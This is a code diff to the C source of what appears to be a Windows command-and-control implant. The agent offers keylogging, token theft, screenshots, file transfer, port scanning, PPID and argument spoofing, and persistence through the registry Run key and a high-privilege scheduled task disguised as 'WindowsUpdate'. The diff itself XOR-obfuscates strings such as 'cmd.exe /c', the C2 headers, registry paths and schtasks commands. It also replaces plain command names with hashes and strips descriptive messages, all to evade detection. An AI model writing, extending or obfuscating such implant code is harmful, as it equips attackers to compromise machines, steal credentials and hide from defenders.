@@ -77,6 +77,7 @@
 #define BUF_SIZE 65536
 
 /* Include agent modules */
+#include "obfstr.h"
 #include "evasion.h"
 #include "bof.h"
 #include "crypto.h"
@@ -247,7 +248,10 @@ static int exec_cmd(const char *cmd, char *out_b64, size_t out_b64_len) {
     if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return -1;
     PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
     char cmdline[4096];
-    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
+    char _cp[] = {0x28,0x26,0x2F,0x65,0x2E,0x33,0x2E,0x6B,0x64,0x28,0x6B,0x00};
+    xdec(_cp, 11);
+    snprintf(cmdline, sizeof(cmdline), "%s%s", _cp, cmd);
+    SecureZeroMemory(_cp, sizeof(_cp));
     BOOL created = FALSE;
 
 #if ENABLE_ARG_SPOOF
@@ -319,17 +323,25 @@ static int http_post(const char *host, int port, int use_https, const char *path
     if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return -1; }
 
     char hdr_narrow[640];
+    /* "X-Agent-ID" XOR 0x4B */
+    char _hx[] = {0x13,0x66,0x0A,0x2C,0x2E,0x25,0x3F,0x66,0x02,0x0F,0x00};
+    xdec(_hx, 10);
+    /* "X-Encrypted" XOR 0x4B */
+    char _hs[] = {0x13,0x66,0x0E,0x25,0x28,0x39,0x32,0x3B,0x3F,0x2E,0x2F,0x00};
+    xdec(_hs, 11);
     if (agent_id && agent_id[0]) {
         if (encrypted)
             snprintf(hdr_narrow, sizeof(hdr_narrow),
-                     "Content-Type: application/octet-stream\r\nX-Agent-ID: %s\r\nX-Encrypted: 1\r\n",
-                     agent_id);
+                     "Content-Type: application/octet-stream\r\n%s: %s\r\n%s: 1\r\n",
+                     _hx, agent_id, _hs);
         else
             snprintf(hdr_narrow, sizeof(hdr_narrow),
-                     "Content-Type: application/json\r\nX-Agent-ID: %s\r\n", agent_id);
+                     "Content-Type: application/json\r\n%s: %s\r\n", _hx, agent_id);
     } else {
         snprintf(hdr_narrow, sizeof(hdr_narrow), "Content-Type: application/json\r\n");
     }
+    SecureZeroMemory(_hx, sizeof(_hx));
+    SecureZeroMemory(_hs, sizeof(_hs));
     WCHAR hdr_wide[640]; ascii_to_wide(hdr_narrow, hdr_wide, 640);
 
     if (use_https) {
@@ -818,8 +830,11 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                     b64_decode(kex_nonce_b64, kex_nonce, 32);
 
                     if (ecdh_compute_shared(&g_ecdh_kp, srv_pub, shared) == 0) {
-                        hkdf_sha256(shared, 32, kex_nonce, 32, "apex-c2-v1",
+                        char _hl[] = {0x2A,0x3B,0x2E,0x33,0x66,0x28,0x79,0x66,0x3D,0x7A,0x00};
+                        xdec(_hl, 10);
+                        hkdf_sha256(shared, 32, kex_nonce, 32, _hl,
                                     g_session_key, 32);
+                        SecureZeroMemory(_hl, sizeof(_hl));
                         g_session_ready = 1;
                         /* Register session key for sleep XOR protection */
                         heap_register_region(g_session_key, sizeof(g_session_key));
@@ -874,26 +889,27 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
             char out_b64[BUF_SIZE];
             out_b64[0] = '\0';
             int success = 1;
+            unsigned int ch = cmd_hash(tasks[t].command);
 
-            if (strcmp(tasks[t].command, "sleep") == 0) {
+            if (ch == CMD_SLEEP) {
                 handle_sleep_cmd(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "whoami") == 0) {
+            } else if (ch == CMD_WHOAMI) {
                 handle_whoami(out_b64);
-            } else if (strcmp(tasks[t].command, "ps") == 0) {
+            } else if (ch == CMD_PS) {
                 handle_ps(out_b64);
-            } else if (strcmp(tasks[t].command, "pwd") == 0) {
+            } else if (ch == CMD_PWD) {
                 handle_pwd(out_b64);
-            } else if (strcmp(tasks[t].command, "cd") == 0) {
+            } else if (ch == CMD_CD) {
                 handle_cd(args_decoded[0] ? args_decoded : ".", out_b64);
-            } else if (strcmp(tasks[t].command, "getuid") == 0) {
+            } else if (ch == CMD_GETUID) {
                 handle_getuid(out_b64);
-            } else if (strcmp(tasks[t].command, "bof") == 0) {
+            } else if (ch == CMD_BOF) {
                 handle_bof(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "download") == 0) {
+            } else if (ch == CMD_DOWNLOAD) {
                 handle_download(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "upload") == 0) {
+            } else if (ch == CMD_UPLOAD) {
                 handle_upload(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "screenshot") == 0) {
+            } else if (ch == CMD_SCREENSHOT) {
                 char *ss_buf = (char *)malloc(2 * 1024 * 1024);
                 if (ss_buf) {
                     ss_buf[0] = '\0';
@@ -907,58 +923,59 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                     continue;
                 }
                 b64_encode((unsigned char*)"Out of memory for screenshot", 28, out_b64);
-            } else if (strcmp(tasks[t].command, "portscan") == 0) {
+            } else if (ch == CMD_PORTSCAN) {
                 handle_portscan(args_decoded, out_b64, BUF_SIZE);
-            } else if (strcmp(tasks[t].command, "keylogger") == 0) {
+            } else if (ch == CMD_KEYLOGGER) {
                 handle_keylogger(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "steal_token") == 0) {
+            } else if (ch == CMD_STEAL_TOKEN) {
                 handle_steal_token(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "make_token") == 0) {
+            } else if (ch == CMD_MAKE_TOKEN) {
                 handle_make_token(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "rev2self") == 0) {
+            } else if (ch == CMD_REV2SELF) {
                 handle_rev2self(out_b64);
-            } else if (strcmp(tasks[t].command, "getprivs") == 0) {
+            } else if (ch == CMD_GETPRIVS) {
                 handle_getprivs(out_b64);
-            } else if (strcmp(tasks[t].command, "runas") == 0) {
+            } else if (ch == CMD_RUNAS) {
                 handle_runas(args_decoded, out_b64);
-            } else if (strcmp(tasks[t].command, "blockdlls") == 0) {
+            } else if (ch == CMD_BLOCKDLLS) {
 #if ENABLE_BLOCK_DLLS
                 if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
                     g_block_dlls = 1;
-                    b64_encode((unsigned char*)"BlockDLLs enabled", 17, out_b64);
+                    b64_encode((unsigned char*)"Enabled", 7, out_b64);
                 } else {
                     g_block_dlls = 0;
-                    b64_encode((unsigned char*)"BlockDLLs disabled", 18, out_b64);
+                    b64_encode((unsigned char*)"Disabled", 8, out_b64);
                 }
 #else
-                b64_encode((unsigned char*)"BlockDLLs not compiled in", 25, out_b64);
+                b64_encode((unsigned char*)"Not available", 13, out_b64);
 #endif
-            } else if (strcmp(tasks[t].command, "argspoof") == 0) {
+            } else if (ch == CMD_ARGSPOOF) {
 #if ENABLE_ARG_SPOOF
                 if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
                     g_arg_spoof = 1;
-                    b64_encode((unsigned char*)"Argument spoofing enabled", 25, out_b64);
+                    b64_encode((unsigned char*)"Enabled", 7, out_b64);
                 } else {
                     g_arg_spoof = 0;
-                    b64_encode((unsigned char*)"Argument spoofing disabled", 26, out_b64);
+                    b64_encode((unsigned char*)"Disabled", 8, out_b64);
                 }
 #else
-                b64_encode((unsigned char*)"ArgSpoof not compiled in", 24, out_b64);
+                b64_encode((unsigned char*)"Not available", 13, out_b64);
 #endif
-            } else if (strcmp(tasks[t].command, "ppidspoof") == 0) {
+            } else if (ch == CMD_PPIDSPOOF) {
 #if ENABLE_PPID_SPOOF
                 if (args_decoded[0] == '1' || (args_decoded[0] == 'o' && args_decoded[1] == 'n')) {
                     g_ppid_spoof = 1;
-                    b64_encode((unsigned char*)"PPID spoofing enabled", 21, out_b64);
+                    b64_encode((unsigned char*)"Enabled", 7, out_b64);
                 } else {
                     g_ppid_spoof = 0;
-                    b64_encode((unsigned char*)"PPID spoofing disabled", 22, out_b64);
+                    b64_encode((unsigned char*)"Disabled", 8, out_b64);
                 }
 #else
-                b64_encode((unsigned char*)"PPID spoof not compiled in", 26, out_b64);
+                b64_encode((unsigned char*)"Not available", 13, out_b64);
 #endif
-            } else if (strcmp(tasks[t].command, "persist_registry") == 0) {
-                char val_name[256] = "WindowsUpdate";
+            } else if (ch == CMD_PERSIST_REGISTRY) {
+                char val_name[256] = {0x1C,0x22,0x25,0x2F,0x24,0x3C,0x38,0x1E,0x3B,0x2F,0x2A,0x3F,0x2E,0x00};
+                xdec(val_name, 13);
                 char exe_path[MAX_PATH] = "";
 
                 if (args_decoded[0]) {
@@ -978,9 +995,11 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                 }
 
                 HKEY hKey;
+                char _rk[] = {0x18,0x24,0x2D,0x3F,0x3C,0x2A,0x39,0x2E,0x17,0x06,0x22,0x28,0x39,0x24,0x38,0x24,0x2D,0x3F,0x17,0x1C,0x22,0x25,0x2F,0x24,0x3C,0x38,0x17,0x08,0x3E,0x39,0x39,0x2E,0x25,0x3F,0x1D,0x2E,0x39,0x38,0x22,0x24,0x25,0x17,0x19,0x3E,0x25,0x00};
+                xdec(_rk, 45);
                 LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                    0, KEY_SET_VALUE, &hKey);
+                    _rk, 0, KEY_SET_VALUE, &hKey);
+                SecureZeroMemory(_rk, sizeof(_rk));
                 if (res == ERROR_SUCCESS) {
                     res = RegSetValueExA(hKey, val_name, 0, REG_SZ,
                         (BYTE*)exe_path, (DWORD)(strlen(exe_path) + 1));
@@ -988,8 +1007,7 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                     if (res == ERROR_SUCCESS) {
                         char msg[512];
                         snprintf(msg, sizeof(msg),
-                            "Registry persistence added: HKCU\\...\\Run\\%s -> %s",
-                            val_name, exe_path);
+                            "Added: %s -> %s", val_name, exe_path);
                         b64_encode((unsigned char*)msg, strlen(msg), out_b64);
                     } else {
                         b64_encode((unsigned char*)"Failed to set registry value", 28, out_b64);
@@ -999,8 +1017,9 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                     b64_encode((unsigned char*)"Failed to open Run key", 22, out_b64);
                     success = 0;
                 }
-            } else if (strcmp(tasks[t].command, "persist_schtask") == 0) {
-                char task_name[256] = "WindowsUpdateTask";
+            } else if (ch == CMD_PERSIST_SCHTASK) {
+                char task_name[256] = {0x1C,0x22,0x25,0x2F,0x24,0x3C,0x38,0x1E,0x3B,0x2F,0x2A,0x3F,0x2E,0x1F,0x2A,0x38,0x20,0x00};
+                xdec(task_name, 17);
                 char exe_path[MAX_PATH] = "";
 
                 if (args_decoded[0]) {
@@ -1020,16 +1039,24 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                 }
 
                 char schtask_cmd[2048];
+                /* "schtasks /create /tn " XOR 0x4B */
+                char _sc[] = {0x38,0x28,0x23,0x3F,0x2A,0x38,0x20,0x38,0x6B,0x64,0x28,0x39,0x2E,0x2A,0x3F,0x2E,0x6B,0x64,0x3F,0x25,0x6B,0x00};
+                xdec(_sc, 21);
                 snprintf(schtask_cmd, sizeof(schtask_cmd),
-                    "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
-                    task_name, exe_path);
+                    "%s\"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
+                    _sc, task_name, exe_path);
+                SecureZeroMemory(_sc, sizeof(_sc));
 
                 if (exec_cmd(schtask_cmd, out_b64, sizeof(out_b64)) != 0) {
                     b64_encode((unsigned char*)"Failed to create scheduled task", 31, out_b64);
                     success = 0;
                 }
-            } else if (strcmp(tasks[t].command, "persist_remove") == 0) {
-                if (strncmp(args_decoded, "registry ", 9) == 0) {
+            } else if (ch == CMD_PERSIST_REMOVE) {
+                char _rp[] = {0x39,0x2E,0x2C,0x22,0x38,0x3F,0x39,0x32,0x6B,0x00};
+                xdec(_rp, 9);
+                char _tp[] = {0x38,0x28,0x23,0x3F,0x2A,0x38,0x20,0x6B,0x00};
+                xdec(_tp, 8);
+                if (strncmp(args_decoded, _rp, 9) == 0) {
                     char *val_name = args_decoded + 9;
                     HKEY hKey;
                     LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
@@ -1041,7 +1068,7 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                         if (res == ERROR_SUCCESS) {
                             char msg[256];
                             snprintf(msg, sizeof(msg),
-                                "Removed registry persistence: %s", val_name);
+                                "Removed: %s", val_name);
                             b64_encode((unsigned char*)msg, strlen(msg), out_b64);
                         } else {
                             b64_encode((unsigned char*)"Value not found", 15, out_b64);
@@ -1051,25 +1078,30 @@ static DWORD WINAPI agent_loop(LPVOID unused) {
                         b64_encode((unsigned char*)"Failed to open Run key", 22, out_b64);
                         success = 0;
                     }
-                } else if (strncmp(args_decoded, "schtask ", 8) == 0) {
+                } else if (strncmp(args_decoded, _tp, 8) == 0) {
                     char *task_name = args_decoded + 8;
                     char cmd[1024];
+                    char _sd[] = {0x38,0x28,0x23,0x3F,0x2A,0x38,0x20,0x38,0x6B,0x64,0x2F,0x2E,0x27,0x2E,0x3F,0x2E,0x6B,0x64,0x3F,0x25,0x6B,0x00};
+                    xdec(_sd, 21);
                     snprintf(cmd, sizeof(cmd),
-                        "schtasks /delete /tn \"%s\" /f", task_name);
+                        "%s\"%s\" /f", _sd, task_name);
+                    SecureZeroMemory(_sd, sizeof(_sd));
                     if (exec_cmd(cmd, out_b64, sizeof(out_b64)) != 0) {
                         b64_encode((unsigned char*)"Failed to remove task", 21, out_b64);
                         success = 0;
                     }
                 } else {
-                    b64_encode((unsigned char*)"Usage: persist_remove registry <name> | schtask <name>", 54, out_b64);
+                    b64_encode((unsigned char*)"Invalid subcommand", 18, out_b64);
                     success = 0;
                 }
-            } else if (strcmp(tasks[t].command, "exit") == 0) {
-                b64_encode((unsigned char*)"Agent exiting", 13, out_b64);
+                SecureZeroMemory(_rp, sizeof(_rp));
+                SecureZeroMemory(_tp, sizeof(_tp));
+            } else if (ch == CMD_EXIT) {
+                b64_encode((unsigned char*)"Exiting", 7, out_b64);
                 should_exit = 1;
             } else {
                 char cmdline[4096] = "";
-                if (strcmp(tasks[t].command, "exec") == 0 || strcmp(tasks[t].command, "shell") == 0) {
+                if (ch == CMD_EXEC || ch == CMD_SHELL) {
                     if (args_decoded[0]) strncpy(cmdline, args_decoded, sizeof(cmdline)-1);
                 } else {
                     snprintf(cmdline, sizeof(cmdline), "%s%s%s",
